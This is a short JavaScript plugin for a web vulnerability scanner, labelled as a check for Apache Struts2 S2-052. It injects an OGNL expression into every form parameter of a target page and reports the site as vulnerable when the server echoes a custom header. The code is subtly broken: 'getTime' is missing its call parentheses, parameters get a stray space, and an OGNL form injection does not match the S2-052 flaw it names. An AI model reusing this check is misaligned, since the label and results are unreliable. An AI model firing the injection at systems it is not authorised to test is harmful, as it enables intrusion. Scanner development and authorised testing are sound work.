
module.exports={
	tags:"struts2,parms,ognl",
	des:"struts2 052漏洞检测",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052",
		""],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-052"],
	doCheck:function (url,fnCbk,parms)
	{
    var _t = this,_s = _t.self;
    if(!parms)
    {
      _s.request.get(url,function(e,r,b)
      {
        if(!e && b)
        {
          _s.fnDoForm(b,url,r,"ognl");
        }
      });
      return;
    }
    
    var szData = '',
        szVl = "_struts2_ognl" + new Date().getTime,
        szPayload = "#{@org.apache.struts2.ServletActionContext@getResponse().addHeader('struts2','" + szVl + "')}";
    var szOldUrl = url;
    for(var k in parms)
    {
      szData += k + "= " + encodeURIComponent(szPayload) + "&";
    }
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,
			data:szData,
			headers:{
				"content-type":"application/x-www-form-urlencoded",
				"user-agent": _s.g_szUa
			}
		}),
	    function(e,r,b)
	    {
        if(e)_s.error(e);
        else if(r && r.headers)
        {
          var szHd = '';
          if(szHd = r.headers['struts2'])
          {
  				  fnCbk({"url":url,result:szHd,payload:szPayload,vul:true},_t);
          }
          //console.log(b)
        }
	    });
	}
};